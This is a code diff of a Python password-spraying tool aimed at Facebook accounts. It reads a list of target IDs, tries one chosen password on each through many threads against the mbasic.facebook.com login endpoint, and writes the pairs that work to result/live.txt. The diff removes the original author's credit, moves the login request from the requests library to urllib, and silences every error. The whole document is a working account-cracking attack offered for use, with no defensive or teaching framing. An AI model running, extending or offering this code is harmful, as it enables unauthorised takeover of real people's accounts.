@@ -1,15 +1,9 @@
-#!usr/bin/python
-#Note:
-#Author: KANG-NEWBIE (https://t.me kang_nuubi)
-'''
-recode? ok, but don't delete this note:)
-Special thanks to: Derray
-'''
 from threading import Thread
 from requests import post
-import os
+import os, urllib.parse, sys
 os.system('clear')
 
+lie=[]
 chr=[]
 thr=[]
 #color
@@ -26,19 +20,30 @@ print("""%s
            /_/ %sAuthor:KANG-NEWBIE%s
 """%(c,g,w))
 def main(args,kwds):
-	dt={'email':args,'pass':kwds}
-	req=post('https://mbasic.facebook.com/login',data=dt).url
-	if 'save-device' in req or 'm_sess' in req:
-		live="[live] %s => %s"%(args,kwds)
-		try:
-			os.mkdir('result')
-		except FileExistsError:
-			pass
-		tulis="{}\n".format(live)
-		open('result/live.txt','a').write(tulis)
-		print("%s[%slive%s]%s %s -> %s"%(c,g,c,w,args,kwds))
-	else:
-		print("%s[%snot%s]%s %s"%(c,r,c,w,args))
+	try:
+		url='https://mbasic.facebook.com/login.php'
+		dt={'email':args,'pass':kwds,'login':'submit'}
+		#req=post('https://mbasic.facebook.com/login.php',data=dt,headers={'User-Agent':'Mozilla/5.0 (Linux; Android 5.1.1; Andromax C46B2H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.156 Mobile Safari/537.36'}).url
+		data = urllib.parse.urlencode(dt)
+		data = data.encode('utf-8')
+		req = urllib.request.Request(url, data)
+		resp = urllib.request.urlopen(req)
+		respData = resp.read()
+		if 'save-device' in str(respData) or 'm_sess' in str(respData):
+			true='yeah'
+			live="[live] %s => %s"%(args,kwds)
+			lie.append(true)
+			try:
+				os.mkdir('result')
+			except FileExistsError:
+				pass
+			tulis="{}\n".format(live)
+			open('result/live.txt','a').write(tulis)
+			print("%s[%slive%s]%s %s -> %s"%(c,g,c,w,args,kwds))
+		else:
+			print("%s[%snot%s]%s %s"%(c,r,c,w,args))
+	except: pass
+
 try:
 	file=open(input("[in] Id List Target: ")).read().splitlines()
 	pas=input("[in] Password to Crack: ")
@@ -60,10 +65,13 @@ try:
 
 	for t in thr:
 	    t.start()
-
 	for t in thr:
-		t.join()
-except:
-	print("%s[!] Connection Lost: retrying..."%(r))
+	    t.join()
+except KeyboardInterrupt:
+	exit()
+except EOFError:
+	exit()
 
-print("\nLive Results saved: result/live.txt")
+if 'yeah' in str(lie):
+	print("\nLive Results saved: result/live.txt")
+
